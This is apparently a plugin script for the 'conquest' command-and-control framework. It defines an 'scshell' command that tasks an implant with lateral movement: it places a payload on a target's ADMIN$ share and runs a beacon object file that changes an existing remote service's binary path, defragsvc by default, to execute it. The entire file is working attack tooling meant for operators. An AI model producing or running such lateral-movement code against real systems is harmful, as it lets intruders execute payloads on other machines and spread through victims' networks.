import conquest
import os.path
import random

SCRIPT_DIR = os.path.dirname(__file__)

def _scshell(agentId, cmdline, args): 
    target = conquest.get_string(args, 0)
    payloadName, payloadBytes = conquest.get_file(args, 1)
    service = conquest.get_string(args, 2)
    name = conquest.get_string(args, 3)
    share = conquest.get_string(args, 4)

    # Format path
    path = f"\\\\{target}\\{share}\\{name if name else ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8))}"
    if not path.endswith(".exe"): path += ".exe"

    bof = os.path.join(SCRIPT_DIR, f"scshell/scshell.{conquest.arch(agentId)}.o")
    params = conquest.bof_pack("zzzb", [
        target,         # z: Target system
        service,        # z: Target service
        path,           # z: Payload path
        payloadBytes,   # b: Payload bytes         
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_scshell = (
    conquest.createCommand(name="scshell", description="Perform fileless lateral movement by modifying an existing remote service's binary path (SCShell tool).", example="scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe",
                           message="Tasked agent to perform fileless lateral movement via SCShell.", mitre=["T1021.002"])
            .addArgString("target", "Target system hostname or IP address.", True)
            .addArgFile("payload", "Path to payload to execute on the target.", True)
            .addFlagString("--service", "service", "Target service (default: defragsvc).", False, "defragsvc")
            .addFlagString("--name", "name", "Target service name (default: Randomized).")
            .addFlagString("--share", "share", "Share for copying payload (default: ADMIN$).", False, "ADMIN$")
            .setHandler(_scshell)            
).registerToGroup("lateral movement")